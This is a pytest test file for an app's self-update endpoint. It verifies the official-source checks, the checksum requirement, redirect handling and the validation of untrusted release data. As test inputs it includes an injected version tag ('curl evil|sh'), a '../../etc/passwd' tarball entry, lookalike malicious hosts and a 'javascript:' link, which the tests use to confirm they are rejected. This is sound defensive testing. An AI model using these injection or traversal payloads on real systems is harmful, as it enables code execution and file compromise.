import copy
import hashlib
import io
import sys
import tarfile

import httpx
import pytest
from fastapi.testclient import TestClient

from horus_media import __version__, routes_settings, self_update, updates
from horus_media.main import create_app

LATEST = "9.9.9"
OFFICIAL = "https://github.com/watchful-horus/horus-media/releases/download"
ASSET = f"{OFFICIAL}/v{LATEST}/horus-media-v{LATEST}.tar.gz"
RELEASE = {"tag_name": f"v{LATEST}",
           "html_url": "https://github.com/watchful-horus/horus-media/releases/tag/v9.9.9",
           "assets": [{"name": f"horus-media-v{LATEST}.tar.gz", "browser_download_url": ASSET}]}


def tarball(*names: str) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name in names:
            data = b"wheel bytes"
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


@pytest.fixture
def client(tmp_path, monkeypatch):
    """`served` controls the fake GitHub: the tarball, the host it is served from, an optional
    redirect for the download, and the checksum the release document reports ("digest": the
    tarball's real SHA-256 unless a test sets another value, or None to leave it out)."""
    monkeypatch.setenv("HORUS_DB_PATH", str(tmp_path / "horus.db"))
    monkeypatch.setenv("HORUS_UPDATE_URL", "https://api.github.com/repos/o/r/releases/latest")
    monkeypatch.setattr(routes_settings, "_restart_process", lambda: None)
    served = {"asset": tarball(f"./horus_media-{LATEST}-py3-none-any.whl"), "asset_host": "github.com",
              "redirect": None}

    def handler(request: httpx.Request):
        if request.url.host == "api.github.com":
            doc = copy.deepcopy(RELEASE)
            digest = served.get("digest", "sha256:" + hashlib.sha256(served["asset"]).hexdigest())
            if digest:
                doc["assets"][0]["digest"] = digest
            return httpx.Response(200, json=doc)
        if served["redirect"] and request.url.host == "github.com":
            return httpx.Response(302, headers={"location": served["redirect"]})
        if request.url.host == served["asset_host"]:
            return httpx.Response(200, content=served["asset"])
        return httpx.Response(404)

    app = create_app(transport=httpx.MockTransport(handler))
    c = TestClient(app)
    c.served = served
    return c


def as_proxmox(monkeypatch, runs=None):
    monkeypatch.setattr(self_update, "why_not", lambda: None)
    monkeypatch.setattr(self_update, "_installer", lambda: [sys.executable, "-c", "pass"])
    monkeypatch.setattr("horus_media.install_info.kind", lambda: "proxmox")


def backups(tmp_path) -> list:
    return list((tmp_path / "backups").glob("horus-*.zip"))


def test_the_check_offers_update_now_only_where_it_can_work(client, monkeypatch):
    assert LATEST != __version__
    assert client.get("/api/update-check").json()["can_apply"] is False  # not a Proxmox container
    as_proxmox(monkeypatch)
    body = client.get("/api/update-check").json()
    assert body["newer"] and body["can_apply"] is True
    assert "asset_url" not in body and "asset_sha256" not in body


def test_update_now_backs_up_installs_and_restarts(client, monkeypatch, tmp_path):
    as_proxmox(monkeypatch)
    restarted = []
    monkeypatch.setattr(routes_settings, "_restart_process", lambda: restarted.append(1))
    r = client.post("/api/update/apply")
    assert r.status_code == 200 and r.json() == {"updated_to": LATEST, "restarting": True}
    assert backups(tmp_path)  # backed up first


def test_it_refuses_where_it_cannot_update(client):
    r = client.post("/api/update/apply")
    assert r.status_code == 409 and "cannot update itself" in r.json()["detail"]


def test_a_release_that_is_not_on_github_is_not_downloaded(client, monkeypatch):
    as_proxmox(monkeypatch)
    client.served["asset_host"] = "example.com"
    monkeypatch.setitem(RELEASE["assets"][0], "browser_download_url",
                        "https://example.com/horus-media-v9.9.9.tar.gz")
    assert client.get("/api/update-check").json()["can_apply"] is False
    r = client.post("/api/update/apply")
    assert r.status_code == 502 and "official Horus repository" in r.json()["detail"]


def test_a_release_from_another_github_repository_is_not_installed(client, monkeypatch, tmp_path):
    """The release address can be changed in Settings; where Update now installs from cannot."""
    as_proxmox(monkeypatch)
    restarted = []
    monkeypatch.setattr(routes_settings, "_restart_process", lambda: restarted.append(1))
    monkeypatch.setitem(
        RELEASE["assets"][0], "browser_download_url",
        f"https://github.com/someone-else/horus-media/releases/download/v{LATEST}/horus-media-v{LATEST}.tar.gz")
    check = client.get("/api/update-check").json()
    assert check["newer"] is True and check["can_apply"] is False  # still told about it
    r = client.post("/api/update/apply")
    assert r.status_code == 502 and "official Horus repository" in r.json()["detail"]
    assert not restarted and not backups(tmp_path)  # refused before anything was touched


@pytest.mark.parametrize("url", [
    f"http://github.com/watchful-horus/horus-media/releases/download/v{LATEST}/x.tar.gz",
    f"https://github.com.evil.example/watchful-horus/horus-media/releases/download/v{LATEST}/x.tar.gz",
    f"https://evil.example/github.com/watchful-horus/horus-media/releases/download/v{LATEST}/x.tar.gz",
    f"https://user@github.com/watchful-horus/horus-media/releases/download/v{LATEST}/x.tar.gz",
    f"https://github.com:8443/watchful-horus/horus-media/releases/download/v{LATEST}/x.tar.gz",
    "https://github.com/watchful-horus/horus-media/releases/download/../../../../evil/r/releases/download/x.tar.gz",
    "https://github.com/watchful-horus/horus-media-fork/releases/download/v1/x.tar.gz",
    "https://github.com/watchful-horus/horus-media/archive/refs/heads/main.tar.gz",
    "https://objects.githubusercontent.com/anything.tar.gz",
    "", None,
])
def test_only_the_official_release_path_counts(url):
    assert self_update.is_official(url) is False


def test_the_official_release_path_is_accepted():
    assert self_update.is_official(ASSET) is True


def test_a_download_that_does_not_match_the_checksum_is_not_installed(client, monkeypatch):
    as_proxmox(monkeypatch)
    restarted = []
    monkeypatch.setattr(routes_settings, "_restart_process", lambda: restarted.append(1))
    client.served["digest"] = "sha256:" + "0" * 64
    r = client.post("/api/update/apply")
    assert r.status_code == 502 and "checksum" in r.json()["detail"]
    assert not restarted


def test_a_release_without_a_checksum_cannot_be_installed(client, monkeypatch):
    as_proxmox(monkeypatch)
    for missing in (None, "sha256:not-a-hash", "md5:" + "0" * 32):
        client.served["digest"] = missing
        assert client.get("/api/update-check").json()["can_apply"] is False, missing
        r = client.post("/api/update/apply")
        assert r.status_code == 502 and "no checksum" in r.json()["detail"], missing


def test_a_download_redirected_away_from_github_is_not_used(client, monkeypatch):
    as_proxmox(monkeypatch)
    client.served.update(redirect="https://example.com/horus-media-v9.9.9.tar.gz",
                         asset_host="example.com")
    r = client.post("/api/update/apply")
    assert r.status_code == 502 and "other than GitHub" in r.json()["detail"]


def test_a_download_redirected_to_githubs_file_host_is_used(client, monkeypatch):
    as_proxmox(monkeypatch)
    client.served.update(redirect="https://release-assets.githubusercontent.com/x/y?sig=1",
                         asset_host="release-assets.githubusercontent.com")
    assert client.post("/api/update/apply").status_code == 200


def test_a_tarball_without_exactly_one_matching_wheel_is_refused(client, monkeypatch):
    as_proxmox(monkeypatch)
    client.served["asset"] = tarball("./horus_media-1.0.0-py3-none-any.whl")  # wrong version
    assert client.post("/api/update/apply").status_code == 502
    client.served["asset"] = tarball("evil.whl", "../../etc/passwd")
    assert client.post("/api/update/apply").status_code == 502


def test_a_failing_install_does_not_restart(client, monkeypatch):
    as_proxmox(monkeypatch)
    monkeypatch.setattr(self_update, "_installer", lambda: [sys.executable, "-c", "import sys; sys.exit(3)"])
    restarted = []
    monkeypatch.setattr(routes_settings, "_restart_process", lambda: restarted.append(1))
    r = client.post("/api/update/apply")
    assert r.status_code == 502 and "install step failed" in r.json()["detail"]
    assert not restarted


def test_no_newer_version_means_nothing_to_install(client, monkeypatch):
    as_proxmox(monkeypatch)
    monkeypatch.setitem(RELEASE, "tag_name", f"v{__version__}")
    assert client.post("/api/update/apply").status_code == 409


# --- the answer from the release address is not trusted ---------------------------------------

def answer(body) -> httpx.MockTransport:
    return httpx.MockTransport(lambda request: httpx.Response(200, json=body))


@pytest.mark.parametrize("tag", ["9.9.9; curl evil|sh", "<b>9.9.9</b>", "latest", "", "v9", "9.9.9\n1"])
def test_a_version_that_is_not_a_version_is_refused(tag):
    with pytest.raises(updates.UpdateCheckError):
        updates.check("https://example.test/latest", answer({"tag_name": tag}))


def test_a_release_document_that_is_not_an_object_is_refused():
    with pytest.raises(updates.UpdateCheckError):
        updates.check("https://example.test/latest", answer(["tag_name"]))


def test_only_an_https_release_link_is_passed_on():
    for bad in ("javascript:alert(1)", "http://example.test/notes", "data:text/html,x", 7, None):
        found = updates.check("https://example.test/latest",
                              answer({"tag_name": "v9.9.9", "html_url": bad}))
        assert found["release_url"] is None, bad
        assert found["latest"] == "9.9.9" and found["newer"] is True
    good = updates.check("https://example.test/latest",
                         answer({"tag_name": "9.9.9", "html_url": "https://example.test/notes"}))
    assert good["release_url"] == "https://example.test/notes"
